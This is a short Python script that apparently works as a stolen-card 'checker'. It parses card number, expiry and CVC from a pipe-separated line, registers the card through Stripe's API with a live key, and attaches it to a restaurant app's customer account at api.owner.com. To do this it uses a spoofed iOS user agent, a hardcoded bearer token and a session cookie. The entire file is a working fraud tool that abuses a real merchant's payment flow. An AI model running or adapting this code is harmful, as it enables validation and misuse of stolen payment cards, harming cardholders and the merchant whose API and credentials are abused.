import requests,re
from fake_useragent import UserAgent

ua = UserAgent()
def Tele(ccx):
  import requests
  ccx=ccx.strip()
  n = ccx.split("|")[0]
  mm = ccx.split("|")[1]
  yy = ccx.split("|")[2]
  cvc = ccx.split("|")[3]
  if "20" in yy:#Mo3gza
    yy = yy.split("20")[1]
  r = requests.session()
  user_agent = ua.random
  import requests

  url = "https://api.stripe.com/v1/payment_methods"

  payload = {
    'card[cvc]': cvc,
    'card[exp_month]': mm,
    'card[exp_year]': yy,
    'card[number]': n,
    'payment_user_agent': "stripe-ios/23.15.0; variant.legacy; STPPaymentCardTextField",
    'type': "card"
  }

  headers = {
    'User-Agent': "Gios%20Bar%20&%20Grill/264 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
    'baggage': "sentry-environment=production,sentry-public_key=224509e7875b449db9212a0388f713a5,sentry-release=dionysus%4036.0.3,sentry-trace_id=78c36399ee204d5cb29728c7327ca349",
    'authorization': "Bearer pk_live_lYcNhqlKwM4GGRlr4wzTdM04",
    'accept-language': "en-US,en;q=0.9",
    'sentry-trace': "78c36399ee204d5cb29728c7327ca349-17dc211206e14628-0",
    'stripe-version': "2020-08-27",
    'x-stripe-user-agent': "{\"version\":\"0.31.1\",\"url\":\"https:\\/\\/github.com\\/stripe\\/stripe-react-native\",\"vendor_identifier\":\"FA79543B-5E57-4500-A92A-B093B5258032\",\"type\":\"iPhone12,5\",\"name\":\"@stripe\\/stripe-react-native\\/expo\",\"lang\":\"objective-c\",\"model\":\"iPhone\",\"os_version\":\"18.4\",\"bindings_version\":\"23.15.0\",\"partner_id\":\"pp_partner_JBN7LkABco2yUu\"}"
  }

  response = requests.post(url, data=payload, headers=headers)

  id1=(response.json().get('id'))
  import requests
  import json

  url = "https://api.owner.com/customers/KFf9xa71UZgK/locations/3ZUq1h4p4t2R/payment-methods"

  payload = [
    {
      "id": id1,
      "default": True
    },
    {
      "id": "pm_1RS4tbIZ1PF9tmyNHUa46uMO",
      "default": False
    }
  ]

  headers = {
    'User-Agent': "Gios%20Bar%20&%20Grill/264 CFNetwork/3826.500.111.2.2 Darwin/24.4.0",
    'Accept': "application/json",
    'Content-Type': "application/json",
    'x-pb-app-version': "36.0.3",
    'baggage': "sentry-environment=production,sentry-public_key=224509e7875b449db9212a0388f713a5,sentry-release=dionysus%4036.0.3,sentry-trace_id=78c36399ee204d5cb29728c7327ca349",
    'x-pb-app-install-uuid': "ea56f4a9-12de-41d0-af35-43d000c28b04",
    'x-pb-app-build': "264",
    'authorization': "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJkaW9ueXN1cyIsImV4cCI6MTc2MzU5NDQzNSwiaWF0IjoxNzQ4MDQyNDM1LCJzdWIiOiJLRmY5eGE3MVVaZ0siLCJ0eXBlIjoiY3VzdG9tZXIiLCJ2IjoxLCJndWVzdElkIjoiT1VBZXRhbm9MN1pZIiwiZ3Vlc3RDU1JGIjoiYTQzREZsVnhGY1NqTE1RRCJ9.qWZDlguIGvACPzUCDi_bNurPLjPRGHBzA2AW9Dx2CW8",
    'sentry-trace': "78c36399ee204d5cb29728c7327ca349-17dc211206e14628-0",
    'accept-language': "en-US,en;q=0.9",
    'x-pb-audience': "dionysus",
    'x-pb-client': "mobile",
    'Cookie': "__cf_bm=1FomcdbjoXOFBeawCL135sPhSa2bd.rCFNi2VSK2gZ4-1748042435-1.0.1.1-KrCC8Tn2ZXrNaUE6GBooAAgDapGbcCBvLAzP70nMM7UZHG8xb0ksyOgEZ2BwnoSe1DVGw1H6lZdUtYi977sXsQy3nAlHMwq2rWZTllmCPnKts8TJltnrqLF8reSSuwe3"
  }

  r2 = requests.put(url, data=json.dumps(payload), headers=headers)
  return (r2.json())